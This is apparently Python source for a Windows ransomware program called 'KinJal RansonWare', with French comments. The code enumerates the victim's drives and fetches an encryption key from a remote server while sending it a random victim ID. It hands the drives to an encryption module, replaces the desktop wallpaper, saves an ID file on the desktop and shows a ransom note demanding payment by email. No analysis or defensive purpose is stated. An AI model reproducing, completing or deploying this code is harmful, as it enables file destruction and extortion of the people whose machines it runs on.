import os
import sys
import socket
import ctypes
import random
import win32api
import subprocess

from kivy.resources import resource_add_path
from kivy import Config
from kivy.app import App
from kivy.properties import StringProperty
from kivy.uix.relativelayout import RelativeLayout

from Crypter import Encryption_main_file

Config.set('graphics', "fullscreen", "auto")

id_name = str()
class Drive:
    def __init__(self):
        # On utilise l'api win32 de windows pour obtenir la liste des lecteurs disponible sur le système
        self.drive_list = win32api.GetLogicalDriveStrings()

    def GetDrive(self):
        # nous allons formaté la liste des lecteurs disponibles sur le système en une donnée utilisaable
        self.drive_list = (str(self.drive_list)).split("\x00")
        self.drive_list.remove('')
        if "C:\\" in self.drive_list:
            self.drive_list.remove('C:\\')
        return self.drive_list

    def GetKey(self, adresse, port):
        connexion_serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            connexion_serveur.connect((adresse, port))
        except (ConnectionRefusedError, ConnectionError, ConnectionAbortedError, ConnectionResetError):
            connexion_serveur.close()
            sys.exit(1)
        # On génére une chaine qui va être l'identitiant unique pour chaque victime
        #-------------------------------------------------
        id = str()
        value_id = "0123456789"
        for i in range(0, 10):
            val = random.choice(value_id)
            id += val
        # On envoit l'identifiant précédemment générer au serveur et on récupére la clé
        #-------------------------------------------------
        connexion_serveur.sendall(id.encode())
        key = connexion_serveur.recv(2048).decode()
        #--------------------------------------------------
        connexion_serveur.close()
        return key, id

class Encryption_process(Drive):
    def __init__(self, adresse=None, port=None):
        super(Encryption_process, self).__init__()
        self.adresse = adresse
        self.port = port

        self.key, self.name = self.GetKey(self.adresse, self.port)
        self.list_disk = self.GetDrive()
        if self.key and self.name:
            global id_name
            id_name = self.name
    def start(self):
        Encryption_main_file.encryption_setup(self.key, self.list_disk).start_encryption()
        del self.key


# Cette classe s'occupe de la partie graphique du ransonware
class Ranson_Window(RelativeLayout):
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        reperexec = sys._MEIPASS
    else:
        reperexec = os.path.dirname(os.path.abspath(__file__))
    screen_picture = os.path.join(reperexec, "Images/KinJal.png")
    screen_font_one = os.path.join(reperexec, "Font/V10.ttf")
    screen_font_two = os.path.join(reperexec, "Font/V12.ttf")
    text = StringProperty()
    get_id = StringProperty()
    def __init__(self, ranson_id, **kwargs):
        super().__init__(**kwargs)
        self.change_font_screen()

        self.get_id = "Id: {}".format(ranson_id)
        path = os.getenv('USERPROFILE') + '\\Desktop\\KinJal_RansonWare_Id.txt'
        with open(path, "w+") as id_file:
            id_file.write("Keep your id carefully, don't loose it\n{}".format(self.get_id))
        self.text = """Hi dear user\n
                Read this message ATTENTIVELY, and if possible, contact someone from IT dept.
                Your files are fully CRYPTED By KinJal RansonWare.
                CORRECTION the file extension or content of affected files (.KinJ) may cause restoring fail.
                You can send us any affected file and we would repair it
                Affected file MUST NOT contain useful intelligence.
                The rest of the data will be available behind PAY
                Reach us via e-mail for payment info: KinJalRans@protonmail.com\n
                """
    # On chande le font d'ecran de la victime
    def change_font_screen(self):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, self.screen_picture, 0)

class Graphic_screenApp(App):
    def build(self):
        return  Ranson_Window(id_name)

    def decrypt(self):
        print("After generating an .exe file of the decryptor, you can put here a code that will take over the opening of the decryptor")
        sys.exit(0)


if __name__ == "__main__":
    if hasattr(sys, '_MEIPASS'):
        resource_add_path(os.path.join(sys._MEIPASS))
    #Encryption_process('localhost', 2500).start()
    Graphic_screenApp().run()
